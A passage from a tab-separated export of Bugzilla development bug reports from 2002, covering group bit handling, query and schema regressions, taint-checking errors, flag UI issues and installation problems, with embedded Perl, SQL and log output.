2;             } =============================== End of code in editproducts.cgi ===========   code in editgroups.cgi for same purpose ======== code in editgroups.cgi ======================     # Major hack for bit values...  perl can't handle 64-bit ints, so I can't     # just do the math to get the next available bit number, gotta handle     # them as strings...  also, we're actually only going to allow 63 bits     # because that's all that opblessgroupset masks for (the high bit is off     # to avoid signing issues).      my @bitvals = ('1','2','4','8','16','32','64','128','256','512','1024',                    '2048','4096','8192','16384','32768',                     '65536','131072','262144','524288','1048576','2097152',                    '4194304','8388608','16777216','33554432','67108864',                    '134217728','268435456','536870912','1073741824',                    '2147483648',                     '4294967296','8589934592','17179869184','34359738368',                    '68719476736','137438953472','274877906944',                    '549755813888','1099511627776','2199023255552',                    '4398046511104','8796093022208','17592186044416',                    '35184372088832','70368744177664','140737488355328',                     '281474976710656','562949953421312','1125899906842624',                    '2251799813685248','4503599627370496','9007199254740992',                    '18014398509481984','36028797018963968','72057594037927936',                    '144115188075855872','288230376151711744',                    '576460752303423488','1152921504606846976',                    '2305843009213693952','4611686018427387904');      # First the next available bit     my $bit = "";     foreach (@bitvals) {         if ($bit eq "") {             SendSQL("SELECT bit FROM groups WHERE bit=" . SqlQuote($_));             if (!FetchOneColumn()) { $bit = $_; }         }     }     if ($bit eq "") {         ShowError("Sorry, you already have the maximum number of groups " .                   "defined.<BR><BR>You must delete a group first before you " .                   "can add any more.</B>");         PutTrailer("<a href=editgroups.cgi>Back to the group list</a>");         exit;     } =======end of code in editgroups.cgi =-==============
167596%TAB%1031576604%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Query - multiple-select product (and probably component) broken%TAB%Query - multiple-select product (and probably component) brokenAfter products and components moved to seperate tables, a query using a multi-select on product will return. No bugs...  This seems to need something like....  --- Bugzilla/Search.pm  4 Sep 2002 22:43:38 -0000       1.14 +++ Bugzilla/Search.pm  9 Sep 2002 21:45:08 -0000 @@ -129,7 +129,7 @@      if ($F{'product'}) {          push(@supptables, "products products_");          push(@wherepart, "products_.id = bugs.product_id"); -        push(@specialchart, ["products_.name", "anyexact", $F{'product'}]); +        push(@specialchart, ["products_.name", "anyexact", join(',',@{$M{'produ ct'}})]);      }
167643%TAB%1031595954%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Schema Changes from bug 143826 are out of order%TAB%Schema Changes from bug 143826 are out of orderSchema changes for Bug 143826 are higher in checksetup than they should be.
167978%TAB%1031726141%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Fix Throw*Error l10n regressions and add a test to catch more%TAB%Fix Throw*Error l10n regressions and add a test to catch morePeople misuse Throw*Error by putting the string in the CGI. We need to fix the current occurrences, and add a test to catch this heinous behaviour.
168075%TAB%1031753280%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Undefined subroutine &main::Error called at /opt/webtools/bugzilla/buglist.cgi line 1005.%TAB%Undefined subroutine &main::Error called at /opt/webtools/bugzilla/buglist.cgi line 1005.Software error: Undefined subroutine &main::Error called at /opt/webtools/bugzilla/buglist.cgi line 1005.  For help, please send mail to the webmaster (webmaster@mozilla.org), giving this error message and the time and date of the error.
168191%TAB%1031803890%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Checksetup needs to force template recompilation%TAB%Checksetup needs to force template recompilationThe template toolkit seems to assume that, if the data/template/.... file is newer than the template/... file, that it is current.  Unfortunately, especially with sites practicing version control, this is not a safe assumption.   checksetup should force data/template/... to be rebuilt from scratch.  To get burned by this, check out and run 2.16 Then, check out and run 2.14 Now you have data/params from 2.14 and data/template from 2.16 Then check out HEAD and run it You will die because you have a nice new data/template from 2.16 and a template/... from HEAD that is probably a few days old.
168804%TAB%1032071607%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%Document CheckCanChangeField so sites can modify it for local needs%TAB%Document CheckCanChangeField so sites can modify it for local needsThe function CheckCanChangeField in process_bug.cgi defines who can change what. Lots of sites want to tweak the default Bugzilla policy in small ways, and editing this function is the easiest way currently. We should document that function better, and make it more clear how it works, so this is easier for admins to do.
169197%TAB%1032249772%TAB%4030%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Bugzilla RDF format has errors and deprecated style%TAB%Bugzilla RDF format has errors and deprecated styleThe RDF format sent out by Bugzilla has errors and deprecated style according to the W3C RDF validator. Python RDFlib can not deal with the data because of these, which is blocking me & Gagan from upgrading the http://status/bugs tools.   I do not understand the errors at the moment (luckily RDFlib does not seem to care about these it seems), but the warnings with attributes happen because they do not inherit the default namespace (per the namespaces Recommendation). The simple fix is to make the RDF namespace use a prefix.  Below is a report from the W3C RDF validator (http://www.w3.org/RDF/Validator/ARPServlet):  The original RDF/XML document  1: <?xml version="1.0"?> 2: <!-- 1.0@bugzilla.org --> 3: <RDF xmlns="http://www.w3.org/1999/02/22-rdf-syntax-ns#" 4:      xmlns:bz="http://www.bugzilla.org/rdf#" 5:      xmlns:nc="http://home.netscape.com/NC-rdf#"> 6:  7: <bz:result about="http://bugzilla.mozilla.org/buglist.cgi?bug_status=NEW&bug_status=ASSIGNED&bug_status=REOPENED&bug_status=UNCONFIRMED&email1=heikki%40netscape.com&emailtype1=substring&emailassigned_to1=1&short_desc=&short_desc_type=substring&long_desc=&long_desc_type=substring&bug_file_loc=&bug_file_loc_type=substring&field0-0-0=short_desc&type0-0-0=substring&value0-0-0=&format=rdf"> 8:   <bz:installation resource="http://bugzilla.mozilla.org/" /> 9:   <bz:bugs> 10:     <Seq> 11:       <li> 12:          13:         <bz:bug about="http://bugzilla.mozilla.org/show_bug.cgi?id=164344"> 14:            15:           <bz:id nc:parseType="Integer">164344</bz:id> 16:          17:           <bz:severity>critical</bz:severity> 18:           <bz:priority>--</bz:priority> 19:           <bz:owner>heikki@netscape.com</bz:owner> 20:           <bz:os>Linux</bz:os> 21:           <bz:target_milestone>---</bz:target_milestone> 22:           <bz:status_whiteboard></bz:status_whiteboard> 23:           <bz:keywords>hang, regression</bz:keywords> 24:           <bz:summaryfull>Hang after XMLHttpRequest call, trying to dismiss alert</bz:summaryfull> 25:          26:         </bz:bug> 27:        28:       </li> 29:  30:  31:     </Seq> 32:  33:   </bz:bugs> 34:  35: </bz:result> 36:  37: </RDF>   Error Messages Error: {E201} Syntax error when processing "164344". Encountered "164344" Was expecting one of: XML comment processing instruction end element tag property attributes attribute rdf:type [Line = 15, Column = 41]  Warning Messages Warning: {W101} Unqualified use of rdf:about has been deprecated.[Line = 7, Column = 453] Warning: {W101} Unqualified use of rdf:resource has been deprecated.[Line = 8, Column = 62] Warning: {W101} Unqualified use of rdf:about has been deprecated.[Line = 13, Column = 76]
169354%TAB%1032295068%TAB%6793%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla: Keywords & Components,Creating/Changing Bugs%TAB%add "Windows .NET",add "Windows .NET Server 2003" OS,add "Windows 2003 Server" OS,add "Windows Server 2003" OS%TAB%add "Windows .NET",add "Windows .NET Server 2003" OS,add "Windows 2003 Server" OS,add "Windows Server 2003" OSadd "Windows .NET",  add "Windows .NET Server 2003" OS,  add "Windows 2003 Server" OS,  add "Windows Server 2003" OS
169459%TAB%1032330251%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%enter_bug.cgi should not lie saying: "Derivatives" is not a valid product.%TAB%enter_bug.cgi should not lie saying: "Derivatives" is not a valid product.suggestion: change "valid product" to something else.
169561%TAB%1032356272%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Speed up UserInGroup by using cached information%TAB%Speed up UserInGroup by using cached informationUserInGroup currently does a DB lookup. We already have all the information we need to answer the UserInGroup question, because we found it out and stashed it away in $vars->{'user'}{'groups'} in the GetUserInfo() sub in CGI.pl, which is always executed.  So, UserInGroup should use this information instead of accessing the DB. Hopefully this should speed things up a bit, as this is a frequently-called function.
169752%TAB%1032436384%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%activity log should fuse data fields split because they didn't fit%TAB%activity log should fuse data fields split because they didn't fitactivity log should fuse data fields split because they didn't fit
169819%TAB%1032454756%TAB%5003%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%remove  "This is Bugzilla: the Mozilla bug system. For more information..." from footer.html.tmpl%TAB%remove  "This is Bugzilla: the Mozilla bug system. For more information..." from footer.html.tmplI'm trying to free up some wasted realestate on bmo. The text "This is Bugzilla: the Mozilla bug system. For more information..." at the top and bottom of each bugzilla page needs to go. The stuff at the top must be local to bmo but what's in the footer is in the bugzilla tree.
169822%TAB%1032457176%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%data corruption moving bugs between products with attachment statuses that have the same name%TAB%data corruption moving bugs between products with attachment statuses that have the same nameIf you define two attachment statuses that have the same name but are valid for different products, and you move a bug with an attachment that has the status from one product to another, the bug's attachment will appear to have the status in "show bug", but the status will not be checked in "edit attachment", and loading and submitting the "edit attachment" form will cause the status to be cleared.  The solution to this is to migrate the status ID from one number to the other if a bug is moved between products with the same status name.
170019%TAB%1032547011%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Sanity check for attachment status in right product.,Sanity check for flags in right product.%TAB%Sanity check for attachment status in right product.,Sanity check for flags in right product.Attachment statuses can get set on the wrong product.  We need a sanity check for this
170064%TAB%1032582145%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Change error API again%TAB%Change error API againOver in bug 98801, Myk made some good suggestions for more changes to the error API. <sigh :-)>.   Current API:     sub ThrowCodeError {       ($vars->{'error'}, my $unlock_tables, $vars->{'variables'}) = (@_);      sub ThrowUserError {       ($vars->{'error'}, my $unlock_tables) = (@_);  Suggested new API:     sub ThrowCodeError {         ($vars->{'error'}, my $extra_vars, my $unlock_tables) = (@_);      sub ThrowUserError {         ($vars->{'error'}, my $extra_vars, my $unlock_tables) = (@_);  Then both would have:     foreach my $var (keys %$extra_vars) {          $vars->{$var} = $extra_vars->{$var};     }  And ThrowCodeError only would have: $vars->{'variables'} = $extra_vars;  So all the vars in $extra_vars would be printed out on the ThrowCodeError error page. That makes the parameter serve a slightly dual purpose, but I don't think that's a problem.  This API change permits the idiom:     $foo ||       ThrowCodeError("some_error_tag", { 'some_parameter' => $parameter });
170065%TAB%1032583503%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%We need a way to get Bugzilla to tell us its version number%TAB%We need a way to get Bugzilla to tell us its version numberWhen trawling through all the Bugzillas on the web recently, I had to use several tricks to find out what version of Bugzilla people were running, because sometimes it was customised so much that it wasn't visible in the UI at the top of the buglist page.   One of the CGIs should have a way, which can't be disabled by editing templates, of sending a user version information. It should be easy for sites which don't want it to remove it, in the same way that you can change your FTP server's banner message, but it shouldn't be possible to remove it "by accident", when customising.
170073%TAB%1032587307%TAB%17856%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Running checksetup without File::Temp installed results in error.%TAB%Running checksetup without File::Temp installed results in error.In CVS HEAD, running checksetup without File::Temp installed results in error:  blackjesus% ./checksetup.pl  Can't locate File/Temp.pm in @INC (@INC contains: /usr/lib/perl5/i386-linux /usr/lib/perl5 /usr/lib/perl5/site_perl/i386-linux /usr/lib/perl5/site_perl .) at Bugzilla/Config.pm line 95. BEGIN failed--compilation aborted at Bugzilla/Config.pm line 95. BEGIN failed--compilation aborted at ./checksetup.pl line 119.  It should be checked for, and be shown as a required package.
170075%TAB%1032588859%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%Mid-air collision pages should be titled as such%TAB%Mid-air collision pages should be titled as suchSeveral times recently I've clicked "submit" on a bug, and moved to a new window. Looking at the taskbar button, it says "Bug processed" - but, if I go back there, it turns out that it's midaired.  In as many cases as possible, midair collisions should have a title which reflects what they are, rather than the misleading "Bug processed".
170195%TAB%1032683756%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Regression - buglist highlighting broken%TAB%Regression - buglist highlighting brokenRegression - buglist highlighting broken
170213%TAB%1032696249%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla-General%TAB%Make all static HTML files into page.cgi.pages,Make all static HTML files into page.cgi pages%TAB%Make all static HTML files into page.cgi.pages,Make all static HTML files into page.cgi pagesBugzilla currently has the following static HTML files in the root directory: bug_status.html      helpemailquery.html  notargetmilestone.html  votehelp.html bugwritinghelp.html  help.html            quicksearchhack.html confirmhelp.html     how_to_mail.html     quicksearch.html  Translating these files is hard where they are, because there is no possibility for multiple versions. We should make them into page.cgi pages; this gives them proper Bugzilla headers and footers, and makes them translatable.  This will also involve changing quite a few links in these documents and others.
170464%TAB%1032814224%TAB%41741%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General,Administration,Creating/Changing Bugs%TAB%OS/2 disappeared from 'Operating System' list%TAB%OS/2 disappeared from 'Operating System' listUser-Agent:       Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:1.2b) Gecko/20020919 Build Identifier: Mozilla/5.0 (OS/2; U; Warp 4.5; en-US; rv:1.2b) Gecko/20020919  I've just discovered that OS/2 disappeared from 'Operating System' list. What's wrong?   Reproducible: Always
170580%TAB%1032869189%TAB%62523%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Creating/Changing Bugs%TAB%comment-<format>.txt.tmpl not called%TAB%comment-<format>.txt.tmpl not calledI'm trying to use formats and add structured information to the initial comment, per the Bugzilla Guide (section 5.7).  We're trying to use Bugzilla to track facility maintenance requests, so I created a create-facility.html.tmpl file, and added 3 fields to it (unit, permission, resident).  I also created a comment-facility.txt.tmpl file, but this is not being used.  Instead the generic comment.txt.tmpl file is being used instead.  This is a major problem for us, as we want to use one install of Bugzilla to track both maintenance and IS requests, and will need to have at least two different formats, and 2 different comment.txt.tmpl options.  Add the following line somewhere inside the form in create-facility.html.tmpl:  <input type="hidden" name="format" value="facility">  This passes the format parameter on to show_bug, which will then apply it to the comment to get comment-facility.txt.tmpl .  Yes, this requirements needs documenting.
170822%TAB%1032958873%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Linkification process destroys whitespace%TAB%Linkification process destroys whitespaceCurrently, the linkification process destroys whitespace - it's preserved, but the output template doesn't use <pre> tags and so the browser collapses it.  We should use <pre> tags, and make it more obvious what's going on on the page.
170843%TAB%1032962296%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%cvs remove changepassword.cgi%TAB%cvs remove changepassword.cgiThis CGI has been obsolete and redirecting for 2 1/2 years now. It's time for it to retire. 
170986%TAB%1033024778%TAB%33608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%General Summary reports don't work for me with taint checking%TAB%General Summary reports don't work for me with taint checkingWhen I try to run the new general summary reports code from bug 12282, I get taint checking errors:  http://bugzilla.mycompany.com/query.cgi?format=report-table  gives me:  [Thu Sep 26 12:07:48 2002] query.cgi: Use of uninitialized value in concatenation (.) at /Library/Perl/darwin/Template/Provider.pm line 574. [Thu Sep 26 12:07:48 2002] query.cgi: compiled template : Insecure dependency in require while running with -T switch at /Library/Perl/darwin/Template/Provider.pm line 573. [Thu Sep 26 12:07:48 2002] query.cgi: [Thu Sep 26 12:07:49 2002] query.cgi: Use of uninitialized value in concatenation (.) at /Library/Perl/darwin/Template/Provider.pm line 574. [Thu Sep 26 12:07:49 2002] query.cgi: compiled template : Insecure dependency in require while running with -T switch at /Library/Perl/darwin/Template/Provider.pm line 573. [Thu Sep 26 12:07:49 2002] query.cgi:  If I turn off taint checking (remove the -T), that page loads, but then when I generate a report, report.cgi says:  Software error:  Attempted to send tainted string 'SELECT  map_products.name, map_assigned_to.login_name, COUNT(DISTINCT ugmap.group_id) AS cntuseringroups,  COUNT(DISTINCT bgmap.group_id) AS cntbugingroups,  ((COUNT(DISTINCT ccmap.who) AND cclist_accessible)   OR ((bugs.reporter = 1) AND bugs.reporter_accessible)   OR bugs.assigned_to = 1 ) AS canseeanyway  FROM bugs, profiles AS map_assigned_to, products AS map_products LEFT JOIN bug_group_map AS bgmap  ON bgmap.bug_id = bugs.bug_id  LEFT JOIN user_group_map AS ugmap  ON bgmap.group_id = ugmap.group_id  AND ugmap.user_id = 1  AND ugmap.isbless = 0 LEFT JOIN cc AS ccmap  ON ccmap.who = 1 AND ccmap.bug_id = bugs.bug_id  WHERE bugs.assigned_to = map_assigned_to.userid AND bugs.product_id = map_products.id AND (bugs.bug_status = 'NEW' OR bugs.bug_status = 'ASSIGNED' OR bugs.bug_status = 'REOPENED') GROUP BY bugs.bug_id  HAVING cntuseringroups = cntbugingroups OR canseeanyway' to the database at globals.pl line 220.  For help, please send mail to the webmaster ([no address given]), giving this error message and the time and date of the error.   Once I disable taint checking on both of the scripts, it works great. Here is my  checksetup output for reference:  Checking perl modules ... Checking for       AppConfig (v1.52)   ok: found v1.52 Checking for       CGI::Carp (any)     ok: found v1.23 Checking for    Data::Dumper (any)     ok: found v2.101 Checking for     Date::Parse (any)     ok: found v2.23 Checking for             DBI (v1.13)   ok: found v1.30 Checking for      DBD::mysql (v1.2209) ok: found v2.1017 Checking for      File::Spec (v0.82)   ok: found v0.82 Checking for        Template (v2.07)   ok: found v2.08 Checking for      Text::Wrap (v2001.0131) ok: found v2001.0929  The following Perl modules are optional: Checking for              GD (v1.19)    not found Checking for     Chart::Base (v0.99)    not found Checking for     XML::Parser (any)      not found  If you you want to see graphical bug dependency charts, you may install the optional libgd and the Perl modules GD-1.19 and Chart::Base-0.99b, e.g. by running (as root)     perl -MCPAN -e'install "LDS/GD-1.19.tar.gz"'    perl -MCPAN -e'install "N/NI/NINJAZ/Chart-0.99b.tar.gz"'  If you want to use the bug import/export feature to move bugs to or from other bugzilla installations, you will need to install the XML::Parser module by running (as root)     perl -MCPAN -e'install "XML::Parser"'  Checking user setup ... Precompiling templates ... Checking for    MySQL Server (v3.23.6) ok: found v3.23.51   and perl -V output:  Summary of my perl5 (revision 5.0 version 6 subversion 0) configuration:   Platform:     osname=darwin, osvers=6.0, archname=darwin     uname='darwin fisheye 6.0 darwin kernel version 5.2: mon jun 17 09:55:14 pdt 2002; root:xnu-201-14.rootsxnu-201-14.objrelease_ppc power macintosh powerpc '     config_args='-ds -e -Dprefix=/usr -Dccflags=-g  -pipe  -Dldflags='     hint=recommended, useposix=true, d_sigaction=define     usethreads=undef use5005threads=undef useithreads=undef usemultiplicity=undef     useperlio=undef d_sfio=undef uselargefiles=define      use64bitint=undef use64bitall=undef uselongdouble=undef usesocks=undef
171127%TAB%1033086637%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bug_email.pl is broken%TAB%bug_email.pl is brokenThe schema change from the new groups system broke bug_email.pl. The relevant part from the script output is:  select bit from groups where name='ReadInternal': Unknown column 'bit' in 'field list' at globals.pl line 246.  There is propably more references to the old groups table.
171278%TAB%1033129567%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Component/Product IDs mean you can't do change queries on component/product%TAB%Component/Product IDs mean you can't do change queries on component/productIf you go to the Bug Changes section of the query form, you'll notice that component_id and product_id have replaced product and component in the field list. So, you can query for "value changed between date and date" fine, but you can't query for "value changed to" in any meaningful way, because people don't know the IDs for their products. 
171296%TAB%1033135216%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Networking: HTTP,File Handling,Attachments & Requests%TAB%Content-Disposition: attachment brings up Downloading dialog%TAB%Content-Disposition: attachment brings up Downloading dialogWe've just modified Bugzilla to use Content-Disposition to suggest the correct filename for attachments. However, this doesn't work in recent Mozillas (> 1.1; 1.1 and 1.0 work fine), because when you go to Edit the attachment, and it's displayed in an iframe, you get a download dialog. Commenting out the Content-Disposition line:     print qq{Content-Disposition: attachment; filename=$filename\n} if                                                                                 $usedisposition; fixes the problem.
171322%TAB%1033144790%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%process_bug.cgi makes reference to non-existant product variable%TAB%process_bug.cgi makes reference to non-existant product variableBy inspection, found that process_bug.cgi in HEAD (2.17) makes reference to $oldhash{'product'} where that field no longer exists.
171420%TAB%1033208310%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%faulty use of local variables in Flag.pm%TAB%faulty use of local variables in Flag.pmFlag.pm uses $vars sometimes when it needs $::vars, and it contains a reference to &Param that should be &::Param (which actually causes a software error).
171440%TAB%1033218636%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%editgroups shows system groups as usable for bugs even though they are not%TAB%editgroups shows system groups as usable for bugs even though they are noteditbugs.cgi should not put an X in the "Use For Bugs" column for system groups.  This is striclty cosmetic, but should be fixed to avoid confusion.
171475%TAB%1033242102%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests,Documentation,Attachments & Requests%TAB%Flag UI is confusing%TAB%Flag UI is confusingIn the UI for setting up flags (editflagtypes.cgi), it is not clear that the default if nothing is either specificically included or excluded is that everything is excluded.  Since the drop-down fields look very inclusive by default, this should either be explicitly stated in the text of the UI or else the default when a new flag is created should be to make it included in all.  Also, the whole flags feature needs a serious doc update or a good explanation in the UI.
171478%TAB%1033242479%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Attachments & Requests%TAB%xml bug output should include attachment flags,XML bug output should include attachment flags%TAB%xml bug output should include attachment flags,XML bug output should include attachment flagsThe xml bug output doesn't include bug or attachment flags. It should.  I'm probably going to fix the bug part as part of the 'remove bug_form.pl' bug (or at least the Bug.pm bits)
171480%TAB%1033245372%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests%TAB%Request queue output for non requestee-specific request is ugly%TAB%Request queue output for non requestee-specific request is uglyIf you have a request without a specific requestee, then those requests show up as unformatted, and not part of a table. This is ugly.  Note that this only happens if you're sorting by requestee, so the same problem may exist if its possible to get a NULL value for anything else you can sort by. I don't think that it is possible, though...
171505%TAB%1033258169%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Attachments & Requests%TAB%Disabled flags should still be visible in the UI%TAB%Disabled flags should still be visible in the UIAs (briefly) discussed on IRC, disabled flags should still who in the UI. They shouldn't be addable/requestable/etc, though. This is similar to how disabled products/groups work.  Note that they will still be findable in queries, so having them shown in the UI is less confusing, anyway, as well as being useful for historical purposes.  If someone truly does't want them shown, then they should be deleted - currently there is no noticable difference between inactive and deleted (except for the search thing)
171506%TAB%1033259555%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Administration%TAB%Sanitycheck broken%TAB%Sanitycheck brokenSELECT DISTINCT product_id, name FROM flagtypes WHERE product_id IS NOT NULL: Unknown column 'product_id' in 'field list' at globals.pl line 287.  Needs to check inclusions/exclusions instead
171527%TAB%1033274166%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%3D Bug Counts%TAB%3D Bug CountsThe new bug counts report only supports 2 dimensions.  It could easily support a third dimension by having multiple tables, one after the other, each with it's own heading.  Then there would be a total table at the end.
171530%TAB%1033274797%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Unspecified axis in bug counts is displayed as '0'.%TAB%Unspecified axis in bug counts is displayed as '0'.When you don't specify a second axis on a bug count reports, the second axis name appears as "0".  It should probably be blank.
171533%TAB%1033274963%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%Bug count reports aren't linked.%TAB%Bug count reports aren't linked.You can't get to the bug count reports as far as I can see.  The links on the footer and main page point to the old reports.cgi.
171639%TAB%1033336034%TAB%4672%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%dupes not marked in original bug%TAB%dupes not marked in original bugesearch shows that process bug is setting the isprivate bit unconditionally  on the dupe comment in the original bug               SendSQL("INSERT INTO cc (who, bug_id) VALUES ($reporter, " . SqlQuote($duplicate) . ")");         } ======== bad line ======         AppendComment($duplicate, $::COOKIE{'Bugzilla_login'}, "*** Bug $::FORM{'id'} has been marked as a duplicate of this bug. ***", 1); =======================         CheckFormFieldDefined(\%::FORM,'comment');         SendSQL("INSERT INTO duplicates VALUES ($duplicate, $::FORM{'id'})");   --------------------  confirmed on landfill [00:10:40] <bbaetz> also: <bbaetz> [% isinsider = Param("insidergroup") && UserInGroup(Param("insidergroup")) %] <justdave> I could swear I pointed that out to someone in a review comment a while back... <bbaetz> so if there isn't an insider group, isinsider is false, and so you never see it <justdave> if there is no insider group everything should be visible, right? <bbaetz> well, what if you deprecate the insider group?    also in my case the "insidersgroup" param was lowercase "insider" while  the group name was "Insider", which had worked up till now because mysql does case insensitive string compares
171674%TAB%1033356551%TAB%57516%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla: Keyword & Component,Bugzilla-General,Documentation%TAB%premature end of script headers,File::Temp (required by TT 2.08) is broken in Perl 5.6.0%TAB%premature end of script headers,File::Temp (required by TT 2.08) is broken in Perl 5.6.0i am facing the following problem .Please check it from ur side i installed bugzilla 2.14 version and it runs fine . when i am installing bugzilla 2.16 on RH7.2 machine after updating all the perl  modules  the checksetup.pl worked fine and database was created  after that i configured apache 2.19 and i am getting normal html files, sample  cgi programs i am able to run  but when i am trying to run index.cgi file i am getting premature end of script  header in log file and in browser it is showing internal error 500 i had done perl index.cgi >>temp.html and when i viewed the html file  it showed the following error and i am able to get the bugzilla home page below  that.Is it a problem in u r version or from my side  if u want more questions about the setup i had done shoot some questions here i will get abck to it   Your vendor has not defined Fcntl macro O_NOINHERIT, used  at /usr/lib/perl5/site_perl/5.6.0/File/Temp.pm line 208.  For help, please send mail to this site's webmaster, giving this error message  and the time and date of the error.   Content-type: text/html  Software error: Your vendor has not defined Fcntl macro O_TEMPORARY, used  at /usr/lib/perl5/site_perl/5.6.0/File/Temp.pm line 229.  For help, please send mail to this site's webmaster, giving this error message  and the time and date of the error. 
172010%TAB%1033479329%TAB%4672%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%voting broken on tip%TAB%voting broken on tipSELECT bugs.bug_id, reporter, assigned_to, qa_contact, reporter_accessible, cclist_accessible, cc.who IS NOT NULL, COUNT(bug_group_map.group_id) as cntbugingroups, COUNT(DISTINCT(user_group_map.group_id)) as cntuseringroups FROM bugs LEFT JOIN cc ON bugs.bug_id = cc.bug_id AND cc.who = 2529 LEFT JOIN bug_group_map ON bugs.bug_id = bug_group_map.bug_id LEFT JOIN user_group_map ON user_group_map.group_id = bug_group_map.group_id AND user_group_map.isbless = 0 AND user_group_map.user_id = 2529 WHERE bugs.bug_id = 837 GROUP BY bugs.bug_id: Table 'cc' was not locked with LOCK TABLES at globals.pl line 246.
172045%TAB%1033489595%TAB%4672%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%can't see restricted bugs if cc set%TAB%can't see restricted bugs if cc setrestricted bugs with a cc set are blocked from valid group members
172284%TAB%1033588962%TAB%40200%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup assumes that there are < 99999 bugs%TAB%checksetup assumes that there are < 99999 bugsBy inspection.....  In checksetup.pl, the regexp appears to presume bug numbers are between 1 and 5 digits          $sth = $dbh->prepare("SELECT longdescs.bug_id, thetext FROM longdescs le ft JOIN bugs using(bug_id) WHERE (thetext " .                 "regexp '[.*.]{3,3} This bug has been marked as a duplicate of [ [:digit:]]{1,5} [.*.]{3,3}') AND (resolution = 'DUPLICATE') ORDER" .                         " BY longdescs.bug_when");         $sth->execute();
172331%TAB%1033615759%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General,Bug Import/Export & Moving%TAB%importxml.pl fails tests under perl 5.8%TAB%importxml.pl fails tests under perl 5.8Using an array as a reference is deprecated at importxml.pl line 229. Using an array as a reference is deprecated at importxml.pl line 263. Using an array as a reference is deprecated at importxml.pl line 279. Using an array as a reference is deprecated at importxml.pl line 292. Using an array as a reference is deprecated at importxml.pl line 420. Using an array as a reference is deprecated at importxml.pl line 422.  The tinderboxes don't see this, probably because they don't ahve the xml module installed  my $bugqty = ($#{@{$tree}->[1]} +1 -3) / 4;  is line 229, others are similar.  I have no clue what this code is trying to do, but dropping the @{..} bit may do something. Possibly. 
